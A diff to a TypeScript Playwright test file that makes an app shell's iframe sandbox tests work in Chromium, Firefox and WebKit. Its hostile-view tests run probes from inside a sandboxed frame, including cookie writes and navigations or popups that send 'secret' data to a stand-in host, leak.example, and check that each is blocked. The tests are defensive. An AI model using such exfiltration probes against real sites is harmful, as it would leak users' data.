@@ -6,7 +6,7 @@ import { mkdir, mkdtemp, rm, writeFile } from 'node:fs/promises';
 import { tmpdir } from 'node:os';
 import { join } from 'node:path';
 import { McpUiInitializeResultSchema } from '@modelcontextprotocol/ext-apps';
-import { type Browser, chromium, type Frame, type Page } from 'playwright';
+import type { Browser, Frame, Page } from 'playwright';
 import { afterAll, beforeAll, describe, expect, it } from 'vitest';
 import { bundlePage } from '../bundle';
 import {
@@ -15,8 +15,10 @@ import {
 	type DeploymentSite,
 	deploymentEntry,
 	deploymentFile,
+	ENGINE,
 	journal,
 	kernelCall,
+	launchEngine,
 	openApp,
 	openShell,
 	packApp,
@@ -31,7 +33,12 @@ let scratch: string;
 let fixtureHandlers: string;
 
 /** Records what it is sent, and sends `initialized` after `delay`, or never. */
-const recordingView = (delay: number | 'never') => `<!doctype html>
+/**
+ * A view that records what it hears. `delay` is how long after its answer it sends `initialized`: never, or only when
+ * the test calls `window.release()` (`'held'`), so a test can read what it heard first, however slowly its engine
+ * reaches into the frame (#706).
+ */
+const recordingView = (delay: number | 'never' | 'held') => `<!doctype html>
 <html lang="en">
 	<head><meta charset="utf-8" /><title>Fixture</title></head>
 	<body>
@@ -45,14 +52,11 @@ const recordingView = (delay: number | 'never') => `<!doctype html>
 				if (!message.method && message.id === 1) {
 					window.log.push('answered');
 					window.initialize = message.result;
-					${
-						delay === 'never'
-							? ''
-							: `setTimeout(() => {
+					const initialized = () => {
 						window.log.push('initialized');
 						parent.postMessage({ jsonrpc: '2.0', method: 'ui/notifications/initialized', params: {} }, '*');
-					}, ${delay});`
-					}
+					};
+					${delay === 'never' ? '' : delay === 'held' ? 'window.release = initialized;' : `setTimeout(initialized, ${delay});`}
 					return;
 				}
 				if (!message.method) return;
@@ -134,7 +138,7 @@ beforeAll(async () => {
 			deploymentEntry('fixture', await viewPackage('fixture', recordingView(0)))
 		),
 	});
-	browser = await chromium.launch();
+	browser = await launchEngine();
 }, 120_000);
 afterAll(async () => {
 	await browser?.close();
@@ -189,6 +193,17 @@ function rpc(frame: Frame, method: string, params: unknown = {}): Promise<RpcAns
 	);
 }
 
+/**
+ * Whether `frame` holds the sandbox proxy's own page. Each engine refuses a framing a policy forbids in its own way
+ * (#706): Chromium shows `chrome-error:`; Firefox an error page Playwright cannot evaluate, whose URL it reports as
+ * empty or, for a frame that was a `srcdoc` document, still as `about:srcdoc`; WebKit an empty document at the refused
+ * URL. None of them is the proxy, whose page loads `proxy.js`. Read it once the refused request has failed.
+ */
+async function rendersProxy(frame: Frame | undefined): Promise<boolean> {
+	if (!frame?.url().startsWith(`${site.sandbox?.origin}/sandbox/`)) return false;
+	return frame.evaluate(() => document.querySelector('script[src="proxy.js"]') !== null);
+}
+
 const logOf = (frame: Frame) => frame.evaluate(() => (window as unknown as { log: string[] }).log);
 
 describe('P2-E13: E2: a view in real frames', () => {
@@ -236,7 +251,7 @@ describe('P2-E13: E2: a view in real frames', () => {
 		const delayed = await serveDeployment({
 			sandbox: true,
 			config: deploymentFile(
-				deploymentEntry('fixture', await viewPackage('delayed', recordingView(400)))
+				deploymentEntry('fixture', await viewPackage('delayed', recordingView('held')))
 			),
 		});
 		const opened = await openShell(browser, delayed.origin);
@@ -252,6 +267,7 @@ describe('P2-E13: E2: a view in real frames', () => {
 			.poll(async () => (await journal(page)).filter((e) => e.command === 'fixture-echo').length)
 			.toBe(1);
 		expect(await logOf(inner)).toEqual(['answered']);
+		await inner.evaluate(() => (window as unknown as { release: () => void }).release());
 		await inner.waitForFunction(() =>
 			(window as unknown as { log: string[] }).log.includes('ui/notifications/tool-result')
 		);
@@ -408,7 +424,13 @@ describe('P2-E13: E2: what a hostile view can reach', () => {
 			return {
 				parent: await attempt(() => parent.document),
 				top: await attempt(() => top?.document),
-				cookie: await attempt(() => document.cookie),
+				// WebKit gives an opaque origin an empty jar, reading "" and keeping nothing written, where Chromium and
+				// Firefox throw; either way no cookie is reached (#706).
+				cookie: await attempt(() => {
+					// biome-ignore lint/suspicious/noDocumentCookie: the probe is a hostile view's own write
+					document.cookie = 'loam-probe=1';
+					if (document.cookie === '') throw Object.assign(new Error(), { name: 'EmptyJar' });
+				}),
 				storage: await attempt(() => localStorage.length),
 				indexedDB: await attempt(() => indexedDB.open('x')),
 				fetchShell: await attempt(() => fetch(`${shell}/deployment.json`)),
@@ -422,7 +444,7 @@ describe('P2-E13: E2: what a hostile view can reach', () => {
 		}, site.origin);
 		expect(reached.parent).toBe('SecurityError');
 		expect(reached.top).toBe('SecurityError');
-		expect(reached.cookie).toBe('SecurityError');
+		expect(reached.cookie).toBe(ENGINE === 'webkit' ? 'EmptyJar' : 'SecurityError');
 		expect(reached.storage).toBe('SecurityError');
 		expect(reached.indexedDB).toBe('SecurityError');
 		expect(reached.fetchShell).toBe('TypeError');
@@ -641,17 +663,30 @@ describe('P2-E13: E2: what a hostile view can reach', () => {
 			leaked.push(route.request().url());
 			return route.fulfill({ status: 200, body: 'leaked' });
 		});
+		// Chromium and WebKit answer `null`; Firefox throws, as its sandbox refuses the popup outright (#706).
 		expect(
-			await inner.evaluate(() => window.open('https://leak.example/?popup=secret') === null)
-		).toBe(true);
+			await inner.evaluate(() => {
+				try {
+					return window.open('https://leak.example/?popup=secret') === null ? 'null' : 'opened';
+				} catch (cause) {
+					return (cause as Error).name;
+				}
+			})
+		).toBe(ENGINE === 'firefox' ? 'InvalidAccessError' : 'null');
 		await inner.evaluate(() => {
+			(window as unknown as { alive: boolean }).alive = true;
 			location.href = 'https://leak.example/?data=secret';
 		});
-		// The proxy's `frame-src 'self'` refuses it. The view has ended itself and told nobody anything.
+		// The proxy's `frame-src 'self'` refuses it, and the view has told nobody anything. In Chromium it has ended
+		// itself on an error page; Firefox and WebKit refuse it in place, so the view's own document goes on (#706).
 		await expect
 			.poll(() => opened.violationFrames.map(({ violation }) => violation.split(' ')[2]))
 			.toContain('frame-src');
-		await expect.poll(() => inner.url()).toMatch(/^chrome-error:/);
+		if (ENGINE === 'chromium') await expect.poll(() => inner.url()).toMatch(/^chrome-error:/);
+		else
+			expect(await inner.evaluate(() => (window as unknown as { alive?: boolean }).alive)).toBe(
+				true
+			);
 		expect(leaked).toEqual([]);
 		// A switch away still removes it, at 500 ms, since it can no longer answer.
 		await openApp(page, 'tally');
@@ -665,12 +700,20 @@ describe('P2-E13: E2: what a hostile view can reach', () => {
 		await openApp(page, 'fixture');
 		const { inner } = await viewFrames(page);
 		const target = `${site.sandbox?.origin}/sandbox/proxy.html?data=secret`;
+		const proxyLoads = () =>
+			site.sandbox?.log.filter(({ path }) => path === '/sandbox/proxy.html').length ?? 0;
+		const before = proxyLoads();
+		// Each engine fails the request once `frame-ancestors` refuses its answer: Chromium's
+		// ERR_BLOCKED_BY_RESPONSE, Firefox's SEC_ERROR_UNKNOWN, WebKit's cancelled. A rendered proxy finishes instead.
+		const refused = page.waitForEvent('requestfailed', (request) => request.url() === target);
 		await inner.evaluate((target) => {
 			location.href = target;
 		}, target);
 		// `frame-src 'self'` lets it through, and `frame-ancestors` lists the shell alone, so the proxy's
-		// own page does not render inside itself.
-		await expect.poll(() => inner.url()).toMatch(/^chrome-error:/);
+		// own page does not render inside itself. The request goes out, to the sandbox's own server alone.
+		await refused;
+		expect(proxyLoads()).toBe(before + 1);
+		expect(await rendersProxy(inner)).toBe(false);
 		await opened.context.close();
 	});
 
@@ -912,14 +955,17 @@ describe('P2-E13: E2: what a hostile view can reach', () => {
 		expect((await fetch(`${site.sandbox?.origin}/deployment.json`)).status).toBe(403);
 		const context = await browser.newContext();
 		const page = await context.newPage();
+		// The control: the shell's own origin, which `frame-ancestors` names, renders it.
+		await page.goto(`${site.origin}/deployment.json`);
+		await page.setContent(`<iframe src="${site.sandbox?.origin}/sandbox/proxy.html"></iframe>`);
+		await expect.poll(() => rendersProxy(page.frames()[1]).catch(() => false)).toBe(true);
 		const other = await serveDist();
 		await page.goto(`${other.origin}/deployment.json`);
-		await page.setContent(`<iframe src="${site.sandbox?.origin}/sandbox/proxy.html"></iframe>`);
-		await page.waitForTimeout(200);
-		const frame = page.frames()[1];
-		expect(await frame?.evaluate(() => location.origin).catch(() => 'blocked')).not.toBe(
-			site.sandbox?.origin
-		);
+		const proxy = `${site.sandbox?.origin}/sandbox/proxy.html`;
+		const refused = page.waitForEvent('requestfailed', (request) => request.url() === proxy);
+		await page.setContent(`<iframe src="${proxy}"></iframe>`);
+		await refused;
+		expect(await rendersProxy(page.frames()[1])).toBe(false);
 		await context.close();
 		await other.close();
 	});
@@ -1202,6 +1248,22 @@ describe('P2-E13: E2: conformance with @modelcontextprotocol/ext-apps', () => {
  */
 const AROUND_THE_FRAME = ['page-has-heading-one'];
 
+/**
+ * What axe finds around the frame under forced colors: nothing, but in Firefox, where the title bar's sidebar toggle
+ * fails color-contrast (#2255, found 2026-11-22). Pinned exactly, so the fix fails this until the entry goes.
+ */
+const FORCED_COLORS_AROUND_THE_FRAME =
+	ENGINE === 'firefox'
+		? [
+				{
+					help: 'Elements must meet minimum color contrast ratio thresholds',
+					id: 'color-contrast',
+					impact: 'serious',
+					nodes: [{ target: [['loam-shell', 'loam-titlebar', 'button[data-toggle="sidebar"]']] }],
+				},
+			]
+		: [];
+
 describe('P2-E13: E2: accessibility', () => {
 	for (const theme of ['light', 'dark', 'high-contrast'] as const)
 		for (const density of ['comfortable', 'compact'] as const)
@@ -1229,7 +1291,7 @@ describe('P2-E13: E2: accessibility', () => {
 		await openApp(page, 'hello');
 		const { inner } = await viewFrames(page);
 		expect(await axe(inner)).toEqual([]);
-		expect(await axe(page, AROUND_THE_FRAME)).toEqual([]);
+		expect(await axe(page, AROUND_THE_FRAME)).toEqual(FORCED_COLORS_AROUND_THE_FRAME);
 		await opened.context.close();
 	});
 
